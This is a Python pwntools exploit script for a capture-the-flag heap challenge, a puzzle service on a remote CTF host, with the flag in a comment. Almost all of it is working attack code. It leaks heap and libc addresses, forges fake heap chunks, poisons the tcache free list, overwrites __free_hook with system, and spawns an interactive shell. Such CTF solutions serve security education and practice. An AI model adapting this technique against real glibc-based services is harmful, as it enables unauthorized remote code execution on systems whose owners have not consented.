from pwn import *

# TWCTF{watashi_puzzle_daisuki_mainiti_yatteru}

bstr = lambda x: x if isinstance(x,bytes) else x.encode()
sstr = lambda x: x if isinstance(x,str) else x.decode()
ehex = lambda b: bstr(b).hex()
dhex = lambda s: bytes.fromhex(sstr(s))
itoa = lambda i: bstr(str(i))

# context.log_level = 'debug'

# p = remote("localhost", 1234)
p = remote("pwn03.chal.ctf.westerns.tokyo", 22915)


def addpuzzle(ti,sz,pz):
    p.recvuntil(b'input: ')
    p.sendline(b'2')
    p.recvuntil(": ")
    p.sendline(ti)
    p.recvuntil(b": ")
    p.sendline(itoa(sz))
    p.recvuntil(b": ")
    p.send(pz)

def delpuzzle(idx):
    p.recvuntil(b'input: ')
    p.sendline(b'3')
    p.recvuntil(b'Index:\n')
    p.sendline(itoa(idx))



leak = [0]*(96*3)

addpuzzle("Puzzle1", 96, b"\x00"*(0x3fc - 12 + 4) + b"\xff"*12)


### play puzzle

def mymakebinstr(l):
    ret = b""
    t = b""
    for i in range(len(l)):
        t += itoa(l[i])
        if i % 8 == 7:
            t = t[::-1]
            ret += t
            t = b""
    return b"0b" + ret

p.recvuntil(b': ')
p.sendline(b'1')
p.recvuntil(b'Index:\n')
p.sendline(b'2')

p.recvuntil("Row's Numbers\n")

for i in range(96):
    xz = p.recvline().strip().split(b',')
    xz.pop()

    if i < 32:
        if len(xz) == 2:
            k = 0
            if (xz[0] == b'2'):
                assert(False)
                leak[96+i] = 1
            else:
                assert(xz[0] == b'1')
                k = 2

            if (xz[1] == b'1'):
                leak[96*k + i] = 1
            else:
                assert(False)
        elif len(xz) == 1:
            if (xz[0] == b'2'):
                leak[96+i] = 1
            elif (xz[0] == b'3'):
                leak[96+i] = 1
                leak[96*2 + i] = 1
        else:
            assert(False)

    else:   #if i >= 32:
        if len(xz) == 2:
            k = 0
            if (xz[0] == b'2'):
                leak[i] = 1
                k = 2
            else:
                assert(xz[0] == b'1')
                k = 1

            if (xz[1] == b'1'):
                leak[96*k + i] = 1
            else:
                assert(xz[1] == b'2' and k == 1)
                leak[96*k + i] = 1
                leak[96*(k+1) + i] = 1
        elif len(xz) == 1:
            if (xz[0] == b'2'):
                leak[i] = 1
            elif (xz[0] == b'3'):
                leak[i] = 1
                leak[96 + i] = 1
            elif (xz[0] == b'4'):
                leak[i] = 1
                leak[96 + i] = 1
                leak[96 * 2 + i] = 1
        else:
            assert(False)

assert(p.recvline().startswith(b"Column"))
dh = dhex(hex(int(mymakebinstr(leak),2))[2:])
v1 = u64(dh[:8])
v2 = u64(dh[8:16])
v3 = u64(dh[16:24])
log.info("%#x",v1)
log.info("%#x",v2)
log.info("%#x",v3)
heapbase = v1 - 0x11f90
print("-----------")
# p.recvuntil(b': ')

p.recvuntil(b': ')
p.sendline(b"a")

X = 4                                                                   # used to keep track of offset
m = b""
m += p64(0) + p64(0)
m += p64(heapbase + 0x124f0 + 0x20 + 0x8 * X + 0x40 * 0)                # pointer 1
m += p64(heapbase + 0x124f0 + 0x20 + 0x8 * X + 0x40 * 1)                # pointer 2
m += p64(heapbase + 0x124f0 + 0x20 + 0x8 * X + 0x40 * 2)                # pointer 3
m += p64(heapbase + 0x124f0 + 0x20 + 0x8 * X + 0x40 * 3)                # pointer 4

# 0 --- vector[0] - fake entire 0x40 size chunk
m += p64(0)
m += p64(0x41)
m += p64(0x1)
m += p64(heapbase + 0x124f0 + 0x300)
m += p64(heapbase + 0x11ff0)                                            # location of libc address on freeing a large chunk
m += p64(0x100)
m += p64(0)
m += p64(0)

# 1 --- vector[1] - fake entire 0x40 size chunk
m += p64(0)
m += p64(0x41)
m += p64(0x1)
m += p64(heapbase + 0x124f0 + 0x350)
m += p64(heapbase + 0x124f0 + 0x200)
m += p64(0x19)
m += p64(0)
m += p64(0)

# 2 -- vector[2] - fake entire 0x40 size chunk
m += p64(0)
m += p64(0x41)
m += p64(0x1)
m += p64(heapbase + 0x124f0)
m += p64(heapbase + 0x124f0 + 0xe0)
m += p64(0x18)
m += p64(0)
m += p64(0)

# fake some 0x30 sized chunks
m = m.ljust(0x200-0x10, b"\x00")
m += (p64(0) + p64(0x31) + p64(0) * 4) * 2
m = m.ljust(0x300-0x10, b"\x00")
m += (p64(0) + p64(0x51) + p64(0) * 8) * 2
m += p64(0) + p64(0x51)


addpuzzle("Puzzle1", 100, m)                                            # add puzzle before deleting - so we don't get reallocated at same location
delpuzzle(2)                                                            # free previously added puzzle to leak libc
addpuzzle("Puzzle2", 100, b"\x00"*0x400 + p64(heapbase + 0x124f0 + 0x10) + p64(heapbase + 0x124f0 + 0x10 + 0x8 * 3) + p64(heapbase + 0x124f0 + 0x100))

p.recvuntil(b"input: ")
p.sendline(b"4")
p.recvuntil("0 : ")
lbase = u64(p.recv(8)) - 0x1ebff0
log.info("%#x", lbase)
p.sendline(b'7')

# free 0x30 size chunks and the large chunk we just added and overlaps with 0x30 size chunks, to overwrite the tcache free list
delpuzzle(1)
delpuzzle(1)

fh = lbase + 0x1eeb28
sy = lbase + 0x55410

# create a fake puzzle and vectors
m = b""
m += b"/bin/sh\x00" * 2
m += p64(heapbase + 0x124f0 + 0x20 + 0x8 * X + 0x40 * 0)                # pointer 1
m += p64(heapbase + 0x124f0 + 0x20 + 0x8 * X + 0x40 * 1)                # pointer 2
m += p64(heapbase + 0x124f0 + 0x20 + 0x8 * X + 0x40 * 2)                # pointer 3
m += p64(heapbase + 0x124f0 + 0x20 + 0x8 * X + 0x40 * 3)                # pointer 4

# 0
m += b"/bin/sh\x00"
m += p64(0x41)
m += p64(0)
m += p64(heapbase + 0x124f0 + 0x20 + 0x8*X)
m += p64(heapbase + 0x124f0 + 0x200 - 0x10)
m += p64(0x100)
m += p64(0)
m += p64(0)

# 1
m += p64(0)
m += p64(0x41)
m += p64(heapbase + 0x12340)
m += p64(heapbase + 0x124f0 + 0x350)
m += p64(heapbase + 0x124f0 + 0x200)
m += p64(0x19)
m += p64(0)
m += p64(0)

m += p64(0)
m += p64(0x41)
m += p64(heapbase + 0x124f0 + 0x20 + 0x8 * X)
m += p64(heapbase + 0x124f0)
m += p64(heapbase + 0x124f0 + 0xe0)
m += p64(0x18)
m += p64(0)
m += p64(0)

m = m.ljust(0x200-0x10, b"\x00")
m += (b"/bin/sh\x00" + p64(0x31) + (p64(fh) + p64(heapbase + 0x10)) * 2) * 2
m = m.ljust(0x300-0x10, b"\x00")
m += (p64(0) + p64(0x51) + p64(0) * 8) * 2
m += p64(0) + p64(0x51)

# reallocate to overwrite the tcache free list
addpuzzle("Puzzle1", 100, m)
# overwrite over free hook
addpuzzle(p64(sy) + (p64(0) * 3) + b"\x01",  40, b"/bin/sh\x00")

p.recvuntil(b'input: ')
p.sendline(b'3')

p.interactive()
